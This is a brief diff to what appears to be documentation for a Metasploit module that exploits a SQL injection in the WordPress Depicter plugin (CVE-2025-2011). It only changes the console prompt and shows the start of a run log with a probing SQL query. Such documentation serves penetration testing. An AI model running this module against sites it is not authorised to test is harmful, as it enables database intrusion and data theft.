@@ -106,7 +106,7 @@ The module should:
 ## Scenarios
 
 ```bash
-msf6 auxiliary(gather/wp_depicter_sqli_cve_2025_2011) > exploit
+msf auxiliary(gather/wp_depicter_sqli_cve_2025_2011) > exploit
 [*] Running automatic check ("set AutoCheck false" to disable)
 [*] {SQLi} Executing (select 'bEJ')
 [*] {SQLi} Encoded to (select 0x62454a)
